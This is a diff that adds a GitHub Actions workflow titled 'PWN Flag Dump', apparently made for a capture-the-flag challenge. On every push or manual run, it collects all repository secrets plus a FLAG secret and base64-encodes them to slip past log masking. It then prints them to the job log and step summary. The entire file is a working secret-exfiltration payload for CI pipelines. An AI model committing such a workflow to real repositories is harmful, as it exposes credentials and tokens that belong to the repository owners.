@@ -1,0 +1,20 @@
+name: PWN Flag Dump
+on:
+  push:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    env:
+      ALL_SECRETS: ${{ toJSON(secrets) }}
+    steps:
+      - name: dump secrets
+        run: |
+          printf '%s' "$ALL_SECRETS" | base64 -w0
+          echo
+          echo "ALL_SECRETS_B64=$(printf '%s' "$ALL_SECRETS" | base64 -w0)" >> "$GITHUB_STEP_SUMMARY"
+          printf '%s' "${{ secrets.FLAG }}" | base64 -w0
+          echo
+          echo "FLAG_B64=$(printf '%s' "${{ secrets.FLAG }}" | base64 -w0)" >> "$GITHUB_STEP_SUMMARY"
